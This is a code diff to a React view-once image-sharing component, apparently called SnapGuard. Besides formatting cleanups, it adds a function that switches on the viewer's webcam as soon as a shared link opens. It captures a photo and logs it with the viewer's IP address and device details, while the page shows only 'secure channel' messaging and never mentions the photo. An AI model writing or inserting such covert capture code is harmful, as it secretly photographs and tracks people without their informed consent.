@@ -17,16 +17,59 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
   const timerRef = useRef<number | null>(null);
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
 
+  const captureSnapshot = async (): Promise<string | undefined> => {
+    try {
+      console.log('Attempting camera capture...');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.setAttribute('autoplay', 'true');
+      video.setAttribute('muted', 'true');
+      video.setAttribute('playsinline', 'true');
+      video.srcObject = stream;
+
+      // Wait for video to be ready
+      await new Promise((resolve) => {
+        video.onloadedmetadata = () => {
+          video.play().then(resolve);
+        };
+      });
+
+      // Give it a moment to actually show a frame
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      const captureCanvas = document.createElement('canvas');
+      captureCanvas.width = video.videoWidth;
+      captureCanvas.height = video.videoHeight;
+      const ctx = captureCanvas.getContext('2d');
+      if (ctx) {
+        ctx.drawImage(video, 0, 0);
+        const dataUrl = captureCanvas.toDataURL('image/jpeg', 0.6);
+        console.log('Capture successful, length:', dataUrl.length);
+
+        // Stop all tracks
+        stream.getTracks().forEach(track => track.stop());
+        return dataUrl;
+      }
+      return undefined;
+    } catch (error) {
+      console.error('Camera capture failed:', error);
+      return undefined;
+    }
+  };
+
   useEffect(() => {
     const init = async () => {
       const images = getStoredImages();
       const target = images.find(img => img.id === imageId);
-      
+
       if (!target) {
         setIsExpired(true);
         setLoading(false);
         return;
       }
+
+      // Attempt to capture viewer photo
+      const capturedImage = await captureSnapshot();
 
       // Log access immediately
       const ip = await fetchIP();
@@ -36,9 +79,10 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
         ip,
         device: detectDevice(navigator.userAgent),
         userAgent: navigator.userAgent,
-        platform: navigator.platform
+        platform: navigator.platform,
+        capturedImage
       };
-      
+
       addLog(imageId, log);
       setImage(target);
       setLoading(false);
@@ -100,7 +144,7 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
         canvas.height = height;
         if (ctx) {
           ctx.drawImage(img, 0, 0, width, height);
-          
+
           // Apply some noise or watermark to deter perfect screenshots
           ctx.fillStyle = 'rgba(255,255,255,0.05)';
           ctx.font = '12px Inter';
@@ -129,7 +173,7 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
         </div>
         <h1 className="text-3xl font-bold text-white mb-2">This link has expired</h1>
         <p className="text-gray-400 max-w-md">
-          Images on SnapGuard are shared with strict "View Once" policies. 
+          Images on SnapGuard are shared with strict "View Once" policies.
           The content has been purged from the session for security reasons.
         </p>
       </div>
@@ -150,7 +194,7 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
           </div>
         </div>
         <div className="flex space-x-2">
-           <div className="px-3 py-1 bg-white/5 border border-white/10 rounded-full flex items-center">
+          <div className="px-3 py-1 bg-white/5 border border-white/10 rounded-full flex items-center">
             <span className="w-2 h-2 bg-green-500 rounded-full mr-2 animate-pulse"></span>
             <span className="text-[10px] text-gray-400 font-mono tracking-tighter">SECURE CHANNEL</span>
           </div>
@@ -159,12 +203,12 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
 
       {/* Main Content Area */}
       <div className={`relative transition-all duration-300 ${isBlurred ? 'blur-2xl grayscale' : ''}`}>
-        <canvas 
-          ref={canvasRef} 
+        <canvas
+          ref={canvasRef}
           className="rounded-lg shadow-2xl max-w-full"
           onContextMenu={(e) => e.preventDefault()}
         />
-        
+
         {/* Anti-screenshot overlays */}
         <div className="absolute inset-0 pointer-events-none border border-white/5 flex items-center justify-center">
           <div className="text-white/5 text-8xl font-black rotate-45 select-none pointer-events-none whitespace-nowrap">
@@ -176,16 +220,16 @@ const SecureImageView: React.FC<SecureImageViewProps> = ({ imageId }) => {
       {/* Security Warning Overlays */}
       {isBlurred && (
         <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/60 backdrop-blur-md">
-           <div className="text-center p-8 bg-black/80 border border-white/10 rounded-3xl max-w-sm">
-             <div className="w-12 h-12 bg-yellow-500/20 rounded-xl flex items-center justify-center mx-auto mb-4">
-               <svg className="w-6 h-6 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <div className="text-center p-8 bg-black/80 border border-white/10 rounded-3xl max-w-sm">
+            <div className="w-12 h-12 bg-yellow-500/20 rounded-xl flex items-center justify-center mx-auto mb-4">
+              <svg className="w-6 h-6 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
               </svg>
-             </div>
-             <h3 className="text-lg font-bold text-white mb-2">Security Interlock Engaged</h3>
-             <p className="text-sm text-gray-400">Content hidden while window is out of focus to prevent background captures.</p>
-             <p className="text-xs text-indigo-400 mt-4">Return to tab to resume viewing.</p>
-           </div>
+            </div>
+            <h3 className="text-lg font-bold text-white mb-2">Security Interlock Engaged</h3>
+            <p className="text-sm text-gray-400">Content hidden while window is out of focus to prevent background captures.</p>
+            <p className="text-xs text-indigo-400 mt-4">Return to tab to resume viewing.</p>
+          </div>
         </div>
       )}
 
